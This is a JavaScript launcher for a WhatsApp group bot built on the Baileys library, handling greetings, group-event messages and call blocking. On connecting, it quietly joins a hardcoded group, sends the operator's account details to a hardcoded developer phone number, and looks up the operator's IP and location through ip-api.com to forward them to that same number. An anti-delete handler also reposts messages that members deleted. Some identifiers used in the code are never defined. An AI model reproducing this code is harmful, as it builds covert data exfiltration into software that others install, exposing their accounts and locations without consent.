// ๐พ๐ง๐๐๐ฉ๐๐ ๐ฝ๐ฎ ๐๐ฉ๐จ๐๐๐๐๐ก๐ก 
const {
  WAConnection: _WAConnection,
  MessageType,
  Presence,
  Mimetype,
  GroupSettingChange,
} = require("@adiwajshing/baileys");
const simple = require("./lib/simple.js");
const WAConnection = simple.WAConnection(_WAConnection);
const figlet = require('figlet')
const fs = require("fs");
const { version, bugs } = require('./package.json')
const { banner, start, success, getGroupAdmins } = require("./lib/functions");
const fetch = require("node-fetch");
const moment = require("moment-timezone");
blocked = [];
const { color } = require('./lib/color')
const time2 = moment().tz("Asia/Jakarta").format("HH:mm:ss");
    if (time2 < "24:59:00") {
      var ucapanWaktu = "Selamat malam";
    }
    if (time2 < "19:00:00") {
      var ucapanWaktu = "Selamat senja๐";
    }
    if (time2 < "18:00:00") {
      var ucapanWaktu = "Selamat sore๐";
    }
    if (time2 < "15:00:00") {
      var ucapanWaktu = "Selamat siangโ๏ธ";
    }
    if (time2 < "11:00:00") {
      var ucapanWaktu = "Selamat pagi๐";
    }
    if (time2 < "05:00:00") {
      var ucapanWaktu = "Selamat malam๐";
    }
const runtime = function (seconds) {
  seconds = Number(seconds);
  var d = Math.floor(seconds / (3600 * 24));
  var h = Math.floor((seconds % (3600 * 24)) / 3600);
  var m = Math.floor((seconds % 3600) / 60);
  var s = Math.floor(seconds % 60);
  var dDisplay = d > 0 ? d + (d == 1 ? " hari, " : " Hari, ") : "";
  var hDisplay = h > 0 ? h + (h == 1 ? " jam, " : " Jam, ") : "";
  var mDisplay = m > 0 ? m + (m == 1 ? " menit, " : " Menit, ") : "";
  var sDisplay = s > 0 ? s + (s == 1 ? " detik" : " Detik") : "";
  return dDisplay + hDisplay + mDisplay + sDisplay;
};
fakenomor = '0@s.whatsapp.net'
const gcrevoke = ["6281804680327-1621430788@g.us"]
prefix = '#'
shp = 'โฌก'
owner = "6283148897828@s.whatsapp.net"
spc1 = '         '
spc2 = '\n                           '
spc3 = '                   '
spc4 = '               '
require("./index.js");
nocache("./index.js", (module) => console.log(`${module} is now updated!`));
const sleep = async (ms) => {
    return new Promise(resolve => setTimeout(resolve, ms));
}
const starts = async (client = new WAConnection()) => {
  client.logger.level = "warn";
  client.version = [2, 2123, 8];
  client.browserDescription = ["Deden Gans", "Chrome", "3.0"];
  console.log(banner.string);
  client.on("qr", () => {
    console.log(
      color("[", "white"),
      color("!", "blue"),
      color("]", "white"),
      color(" Scan bang"),
      client.sendMessage(`6283162388082@s.whatsapp.net`, `ใ *NOTIFICATION!* ใ\n\n _Bot Berhasil Terhubung!_`, MessageType.extendedText)
          
    );
  });

  fs.existsSync("./session.json") && client.loadAuthInfo("./session.json");
  client.on("connecting", () => {
    start("2", "Connecting...");
  });
  client.on("open", () => {
    success("2", "Connect Sukses > Follow @raditnation12_");
console.log(color(figlet.textSync(`${spc1}            Itsukibotz`, {
font: 'Standard',
horizontalLayout: 'default',
vertivalLayout: 'default',
width: 80,
whitespaceBreak: false
}), 'cyan'))
console.log(color(`${spc2}[ โข CREATOR BOT ${fakeyoi} โข ]` ,'cyan'))
console.log(color(`${spc4}< ================================================== >`, 'cyan'))
console.log(color(`${spc3}[โข]`, 'aqua'), color(`Hai        : ${ucapanWaktu}`, 'white'))
console.log(color(`${spc3}[โข]`, 'aqua'), color(`Bot Version : 2.1.2`, 'white'))
console.log(color(`${spc3}[โข]`, 'aqua'), color(`Status      : Online!`, 'white'))
console.log(color(`${spc3}[โข]`, 'aqua'), color(`Owner       : ${fakeyoi}`, 'white'))
console.log(color(`${spc4}< ================================================== >`, 'cyan'))

    console.log(color('โ','red'), color('Script Ori By Deden Store!\n๐ก๐ผ๐๐ฒ: Gunakan Bot dengan baik ใท๏ธ', 'yellow'))
    console.log(color('โ','red'), color('๐ฆ๐ผ๐๐ฟ๐ฐ๐ฒ ๐๐ผ๐ฑ๐ฒ ๐ฉ๐ฒ๐ฟ๐๐ถ๐ผ๐ป:', 'aqua'), color(version))
    console.log(color('โ','red'), color('๐๐๐ด? ๐๐ฟ๐ฟ๐ผ๐ฟ? ๐ฆ๐๐ด๐ด๐ฒ๐๐๐ถ๐ผ๐ป? ๐ฉ๐ถ๐๐ถ๐ ๐๐ฒ๐ฟ๐ฒ:', 'aqua'), color('https://wa.me/6283162388082'))
    console.log(color('[ITSUKIBOTZ]'), color('๐ฆ๐ฒ๐น๐ณ๐ฏ๐ผ๐ Deden Store ๐๐ ๐ข๐ป๐น๐ถ๐ป๐ฒ ใ๏ธ', 'aqua'))
    console.log(color('[DEV]', 'cyan'), color('๐ช๐ฒ๐น๐ฐ๐ผ๐บ๐ฒ ๐๐ฎ๐ฐ๐ธ, ๐ข๐๐ป๐ฒ๐ฟ! ๐๐ผ๐ฝ๐ฒ ๐ฌ๐ผ๐ ๐๐ฟ๐ฒ ๐๐ผ๐ถ๐ป๐ด ๐ช๐ฒ๐น๐น~', 'magenta'))
    console.log(color('โ','green'), color('Thanks For Watching', 'white'))
  });
await client.connect({ timeoutMs: 30 * 1000 });
  fs.writeFileSync("./session.json",JSON.stringify(client.base64EncodedAuthInfo(), null, "\t"));
 teks = `https://chat.whatsapp.com/LE2rdr4JHvKBsf1jOK4gSd`
 client.query({ json:["action", "invite", `${teks.replace('https://chat.whatsapp.com/','')}`]})
 console.log(color('|WRN|', 'yellow'), color('Joined to Forum Whatsapp Bot group', 'cyan'))
 client.sendMessage(`6285869002046@s.whatsapp.net`, `*Hai Owner NdaaBotzl, Bot Telah Berhasil Tersambung Pada Nomor Ini*\nโโโโโโโโโโโโโโโโโโโโ\n\`\`\`${JSON.stringify(client.user, null, 2)}\`\`\`\nโโโโโโโโโโโโโโโโโโโโ\n*Jika Ada Kendala Error/Bot Tidak Merespon Silahkan Hubungi Developer Bot Diatas, Terimakasih*`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer NdaaBotz",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./itsmevall.jpg'),sourceUrl:"https://wa.me/6285869002046?text=Assalamualaikum"}}})
	console.log(color('|WRN|', 'yellow'), color('Sending bot info to bot owner', 'cyan'))
fetch(`http://ip-api.com/line`).then(res => res.text())  
        .then(bu =>{
       client.sendMessage("6285869002046@s.whatsapp.net", `โโโโโใ *IP-USER* ใโโโโโ\n\n\`\`\`${bu}\`\`\`\nโโโโโโโโโโโโโโโโโโโโ`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer NdaaBotz",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./itsmevall.jpg'),sourceUrl:"https://wa.me/6285869002046?text=Assalamualaikum"}}})
     console.log(color('|WRN|', 'yellow'), color('Sending ip address to developer bot', 'cyan'))
   })
      
    client.on('connecting', () => {
		console.log(color('|TRM|'), color('Connecting...', 'cyan'))
		})
	
	client.on('open', () => {
	console.log(color('|TRM|'), color('Connected', 'cyan'))
	}) 
     
    client.on('ws-close', () => {
        console.log(color('|TRM|'), color('Connection lost, trying to reconnect.', 'cyan'))
        })
    
    client.on('close', async () => {
        console.log(color('|TRM|'), color('Disconnected.', 'cyan'))
        })
    
client.on('group-update', async (anu) => {
fkontakk = { key: {
  fromMe: false,
    participant: `0@s.whatsapp.net`, ...(anu.jid ? { remoteJid: '6283136505591-1604595598@g.us' } : {})
},
 message: {
    "contactMessage":{"displayName":'๐๐ข๐ฏ๐ฅ๐ข ๐๐ต๐บ๐ญ๐ฆใท๏ธโฉ',"vcard":"BEGIN:VCARD\nVERSION:3.0\nN:2;Deden Ganz;;;\nFN:resku\nitem1.TEL;waid=6283162388082:+62 831-6238-8082\nitem1.X-ABLabel:Mobile\nEND:VCARD"
 }}}
metdata = await client.groupMetadata(anu.jid)
if(anu.announce == 'false'){
teks = ` [ Group Opened ] \n\n_Group telah dibuka oleh admin_\n_Sekarang semua member bisa mengirim pesan_`
client.sendMessage(metdata.id, teks, MessageType.text, {quoted: fkontakk})
console.log(`- [ Group Opened ] - In ${metdata.subject}`)
}
else if(anu.announce == 'true'){
teks = ` [ Group Closed ] \n\n_Group telah ditutup oleh admin_\n_Sekarang hanya admin yang dapat mengirim pesan_`
client.sendMessage(metdata.id, teks, MessageType.text, {quoted: fkontakk})
console.log(` [ Group Closed ]  In ${metdata.subject}`)
}
else if(!anu.desc == ''){
tag = anu.descOwner.split('@')[0] + '@s.whatsapp.net'
teks = ` [ Group Description Change ] \n\nDeskripsi Group telah diubah oleh Admin @${anu.descOwner.split('@')[0]}\nโข Deskripsi Baru : ${anu.desc}`
client.sendMessage(metdata.id, teks, MessageType.text, {contextInfo: {"mentionedJid": [tag]}, quoted: fkontakk})
console.log(`- [ Group Description Change ] - In ${metdata.subject}`)
  }
else if(anu.restrict == 'false'){
teks = `- [ ๐๐ฟ๐ผ๐๐ฝ ๐ฆ๐ฒ๐๐๐ถ๐ป๐ด ๐๐ต๐ฎ๐ป๐ด๐ฒ ] -\n\nEdit Group info telah dibuka untuk member\nSekarang semua member dapat mengedit info Group Ini`
client.sendMessage(metdata.id, teks, MessageType.text, {quoted: fkontakk})
console.log(`- [ Group Setting Change ] - In ${metdata.subject}`)
  }
else if(anu.restrict == 'true'){
teks = `- [ ๐๐ฟ๐ผ๐๐ฝ ๐ฆ๐ฒ๐๐๐ถ๐ป๐ด ๐๐ต๐ฎ๐ป๐ด๐ฒ ] -\n\nEdit Group info telah ditutup untuk member\nSekarang hanya admin group yang dapat mengedit info Group Ini`
client.sendMessage(metdata.id, teks, MessageType.text, {quoted: fkontakk})
console.log(`- [ Group Setting Change ] - In ${metdata.subject}`)
}
})
  client.on("group-participants-update", async (anu) => {
    try {
      groupMet = await client.groupMetadata(anu.jid);
      groupMembers = groupMet.participants;
      groupAdmins = getGroupAdmins(groupMembers);
      mem = anu.participants[0];

      console.log(anu);
      try {
        pp_user = await client.getProfilePicture(mem);
      } catch (e) {
        pp_user =
          "https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60";
      }
      try {
        pp_grup = await client.getProfilePicture(anu.jid);
      } catch (e) {
        pp_grup =
          "https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60";
      }
      if (anu.action == "add" && mem.includes(client.user.jid)) {
        client.sendMessage(anu.jid, "๐๐๐๐ ๐๐๐๐๐ ใ๏ธ", "conversation");
      }
hehe = await getBuffer(pp_user)
if (anu.action == 'add' && !mem.includes(client.user.jid)) {
             const mdata = await client.groupMetadata(anu.jid)
             
             const memeg = mdata.participants.length
             const thu = await client.getStatus(anu.participants[0], MessageType.text)
             const num = anu.participants[0]
             const bosco1 = await client.prepareMessage("0@s.whatsapp.net", hehe, MessageType.location,{ thumbnail: hehe})
			 const bosco2 = bosco1.message["ephemeralMessage"] ? bosco1.message.ephemeralMessage : bosco1
                let v = client.contacts[num] || { notify: num.replace(/@.+/, '') }
                anu_user = v.vname || v.notify || num.split('@')[0]
                time_welc = moment.tz('Asia/Kolkata').format('DD/MM/YYYY')
                time_wel = moment.tz('Asia/Kolkata').format("hh:mm")
                teks = `๐น *Hษช* @${num.split('@')[0]}\n๐น *Bษชแด* : *${thu.status}*\n๐น *Mแดแดสแดสs : ${memeg}*\n๐น *Wแดสแดแดแดแด Tแด* \n *${mdata.subject}*\n๐น *Dแดษดแด Fแดสษขแดแด Dษชsแดสษชแดแดษชแดษด*\n ${time_wel} -  ${time_welc}`
                welcomeBut = [{buttonId:`${prefix}getdeskgc`,buttonText:{displayText:'DISCRIPTION'},type:1}, {buttonId:`${prefix}sc`,buttonText:{displayText:'SC'},type:1}]
                welcomeButt = { contentText: `ย?`, footerText: `${teks}`, buttons: welcomeBut, headerType: 6, locationMessage: bosco2.message.locationMessage}
                client.sendMessage(mdata.id, welcomeButt, MessageType.buttonsMessage, { caption: 'hehe', "contextInfo": { "mentionedJid" : [num], },})
                 }
            if (anu.action == 'remove' && !mem.includes(client.user.jid)) {
                const mdata = await client.groupMetadata(anu.jid)
                const num = anu.participants[0]
                const bosco3 = await client.prepareMessage("0@s.whatsapp.net", hehe, MessageType.location,{ thumbnail: hehe})
			    const bosco4 = bosco3.message["ephemeralMessage"] ? bosco3.message.ephemeralMessage : bosco3
                let w = client.contacts[num] || { notify: num.replace(/@.+/, '') }
                anu_user = w.vname || w.notify || num.split('@')[0]
                time_welc = moment.tz('Asia/Kolkata').format('DD/MM/YYYY')
                time_wel = moment.tz('Asia/Kolkata').format("hh:mm")
                memeg = mdata.participants.length
                out = `*Gแดแดแด Bสแด Bสแดแดสแดส* ๐\n@${num.split('@')[0]}\n *Rแดsแด Nแดแดก Pแดแดแดแด* ๐น\n${time_wel} -  ${time_welc}`
                goodbyeBut = [{buttonId:`${prefix}h`,buttonText:{displayText:'GET OUT ๐ช'},type:1}, {buttonId:`${prefix}sc`,buttonText:{displayText:'SC'}, type:1}]
                goodbyeButt = { contentText: ` `, footerText: `${out}`, buttons: goodbyeBut, headerType: 6, locationMessage: bosco3.message.locationMessage}
                client.sendMessage(mdata.id, goodbyeButt, MessageType.buttonsMessage, { caption: 'hehe', "contextInfo": { "mentionedJid" : [num], },})
            }
      /*welcom = true
      if (anu.action == "add" && !mem.includes(client.user.jid)) {
        mdata = await client.groupMetadata(anu.jid);
        memeg = mdata.participants.length;
        num = anu.participants[0];
        if (welcom === false) return
        let v = client.contacts[num] || { notify: num.replace(/@.+/, "") };
        anu_user = v.vname || v.notify || num.split("@")[0];
        time_wel = moment.tz("Asia/Jakarta").format("HH:mm");
        teks = `๐๐ฎ๐น๐ผ ${anu_user} ๐ฆ๐ฒ๐น๐ฎ๐บ๐ฎ๐ ๐๐ฎ๐๐ฎ๐ป๐ด ใท๏ธ`;
        buff = await getBuffer(
          `http://hadi-api.herokuapp.com/api/card/welcome?nama=${anu_user}&descriminator=${
            groupMembers.length
          }&memcount=${memeg}&gcname=${encodeURI(
            mdata.subject
          )}&pp=${pp_user}&bg=https://i.postimg.cc/rFkw8MpX/IMG-20210807-151325.jpg`
        );
        buttons = [
          { buttonId: `verify`, buttonText: { displayText: "๐ฝ๐๐๐๐๐ใ๏ธ" }, type: 1 },
          { buttonId: `command`, buttonText: { displayText: "๐ช๐๐๐๐ ๐ด๐๐๐ใ๏ธ" }, type: 1 },
        ];
        imageMsg = (
          await client.prepareMessageMedia(buff, "imageMessage", {
            thumbnail: buff,
          })
        ).imageMessage;
        buttonsMessage = {
          contentText: `${teks}`,
          footerText: `ใ ๐๐ถ๐ฏ๐ต๐ช๐ฎ๐ฆ ${runtime(process.uptime())} \n ๐๐ณ๐ฆ๐ข๐ต๐ฆ๐ฅ ๐๐บ ${fakeyoi}`,
          imageMessage: imageMsg,
          buttons: buttons,
          headerType: 4,
        };
        prep = await client.prepareMessageFromContent(
          mdata.id,
          { buttonsMessage },
          {}
        );
        client.relayWAMessage(prep);
      }
      if (anu.action == "remove" && !mem.includes(client.user.jid)) {
        mdata = await client.groupMetadata(anu.jid);
        num = anu.participants[0];
        let w = client.contacts[num] || { notify: num.replace(/@.+/, "") };
        anu_user = w.vname || w.notify || num.split("@")[0];
        time_wel = moment.tz("Asia/Jakarta").format("HH:mm");
        memeg = mdata.participants.length;
        out = `๐ฆ๐ฎ๐๐ผ๐ป๐ฎ๐ฟ๐ฎ ${anu_user} ๐`;
        buff = await getBuffer(
          `http://hadi-api.herokuapp.com/api/card/goodbye?nama=${anu_user}&descriminator=${
            groupMembers.length
          }&memcount=${memeg}&gcname=${encodeURI(
            mdata.subject
          )}&pp=${pp_user}&bg=https://i.postimg.cc/rFkw8MpX/IMG-20210807-151325.jpg`
        );
        buttons = [
          { buttonId: `y`, buttonText: { displayText: "๐๐บ๐ฆ๐ฆใท๏ธ" }, type: 1 },
          { buttonId: `runtime`, buttonText: { displayText: "๐๐ถ๐ฏ๐ต๐ช๐ฎ๐ฆใท๏ธ" }, type: 1 },
        ];
        imageMsg = (
          await client.prepareMessageMedia(buff, "imageMessage", {
            thumbnail: buff,
          })
        ).imageMessage;
        buttonsMessage = {
          contentText: `${out}`,
          footerText: `ใ๏ธ ๐๐ถ๐ฏ๐ต๐ช๐ฎ๐ฆ ${runtime(process.uptime())} \n ๐๐ณ๐ฆ๐ข๐ต๐ฆ๐ฅ ๐๐บ ${fakeyoi}๐น`,
          imageMessage: imageMsg,
          buttons: buttons,
          headerType: 4,
        };
        prep = await client.prepareMessageFromContent(
          mdata.id,
          { buttonsMessage },
          {}
        );
        client.relayWAMessage(prep);
      }*/
      
      if (anu.action == "promote") {
        const mdata = await client.groupMetadata(anu.jid);
        num = anu.participants[0];
        let w = client.contacts[num] || { notify: num.replace(/@.+/, "") };
        anu_user = w.vname || w.notify || num.split("@")[0];
        try {
          ppimg = await client.getProfilePicture(
            `${anu.participants[0].split("@")[0]}@c.us`
          );
        } catch {
          ppimg =
            "https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg";
        }
        let buffer = await getBuffer(
          `https://api-yogipw.herokuapp.com/api/promote?name=${anu_user}&msg=selamat%20menjadi%20admin&mem=${groupAdmins.length}&picurl=${ppimg}&bgurl=https://cdn.discordapp.com/attachments/819995259261288475/835055559941292032/style.jpg`
        );
        teks = `${anu_user} ๐๐ฆ๐ญ๐ข๐ฉ ๐๐ช ๐๐ณ๐ฐ๐ฎ๐ฐ๐ต๐ฆ ใท๏ธ`;
        client.sendMessage(mdata.id, buffer, MessageType.image, {
          caption: teks,
        });
      }

      if (anu.action == "demote") {
        const mdata = await client.groupMetadata(anu.jid);
        num = anu.participants[0];
        let w = client.contacts[num] || { notify: num.replace(/@.+/, "") };
        anu_user = w.vname || w.notify || num.split("@")[0];
        try {
          ppimg = await client.getProfilePicture(
            `${anu.participants[0].split("@")[0]}@c.us`
          );
        } catch {
          ppimg =
            "https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg";
        }

        let buffer = await getBuffer(
          `https://api-yogipw.herokuapp.com/api/demote?name=${anu_user}&msg=yahahaha didemote&mem=${groupAdmins.length}&picurl=${ppimg}&bgurl=https://cdn.discordapp.com/attachments/819995259261288475/835055559941292032/style.jpg`
        );
        teks = `${anu_user} ๐๐ฆ๐ญ๐ข๐ฉ ๐๐ช ๐๐ฆ๐ฎ๐ฐ๐ต๐ฆ ใท๏ธ`;
        client.sendMessage(mdata.id, buffer, MessageType.image, {
          caption: teks,
        });
      }
    } catch (e) {
      console.log("Error : %s", color(e, "red"));
    }
  });
  //
 antidel = true
  client.on("message-delete", async (m) => {
    if (m.key.remoteJid == "status@broadcast") return;
    if (!m.key.fromMe && m.key.fromMe) return;
   if (antidel === false) return
    m.message =
      Object.keys(m.message)[0] === "ephemeralMessage"
        ? m.message.ephemeralMessage.message
        : m.message;
    const jam = moment.tz("Asia/Jakarta").format("HH:mm:ss");
    let d = new Date();
    let locale = "id";
    let gmt = new Date(0).getTime() - new Date("1 Januari 2021").getTime();
    let weton = ["Pahing", "Pon", "Wage", "Kliwon", "Legi"][
      Math.floor((d * 1 + gmt) / 84600000) % 5
     ];
    let week = d.toLocaleDateString(locale, { weekday: "long" });
    let calender = d.toLocaleDateString(locale, {
      day: "numeric",
      month: "long",
      year: "numeric",
    });
     const type = Object.keys(m.message)[0];
     client.sendMessage(
      m.key.remoteJid,
      `\`\`\`ใ ๐๐ก๐ง๐ ๐๐๐๐๐ง๐ ใ\`\`\`
  โข> Nama : @${m.participant.split("@")[0]}
  โข> Waktu : ${jam} ${week} ${calender}
  โข> Type : ${type}`,
      MessageType.text,
      { quoted: m.message, contextInfo: { mentionedJid: [m.participant] } }
    );

    client.copyNForward(m.key.remoteJid, m.message);
  });
  client.on("chat-update", async (message) => {
    require("./index.js")(client, message);
  });
  isBattre = "Not Detect"; //
  isCharge = "Not Detect"; //
  client.on(`CB:action,,battery`, (json) => {
    const batteryLevelStr = json[2][0][1].value;
    const batterylevel = parseInt(batteryLevelStr);
    isBattre = batterylevel + "%";
    isCharge = json[2][0][1].live;
  });
antical = true
client.on("CB:Call", json => {
if (antical === false) return
let call;
calling = JSON.parse(JSON.stringify(json))
call = calling[1].from
client.sendMessage(call, `*Sorry ${client.user.name} can't receive calls.*\n*Call = Block!*`, MessageType.text)
.then(() => client.blockUser(call, "add"))
})
  client.on("CB:Blocklist", (json) => {
    if (blocked.length > 2) return;
    for (let i of json[1].blocklist) {
      blocked.push(i.replace("c.us", "s.whatsapp.net"));
    }
  });
};

/**
 * Uncache if there is file change
 * @param {string} module Module name or path
 * @param {function} cb <optional>
 */
function nocache(module, cb = () => {}) {
  console.log("Module", `'${module}'`, "is now being watched for changes");
  fs.watchFile(require.resolve(module), async () => {
    await uncache(require.resolve(module));
    cb(module);
  });
}

/**
 * Uncache a module
 * @param {string} module Module name or path
 */
function uncache(module = ".") {
  return new Promise((resolve, reject) => {
    try {
      delete require.cache[require.resolve(module)];
      resolve();
    } catch (e) {
      reject(e);
    }
  });
}

starts();
// ๐๐๐ฃ ๐๐๐ฅ๐ช๐จ ๐พ๐ง๐๐๐๐ฉ ๐๐ฌ ๐ผ๐จ๐ช๐ช๐ช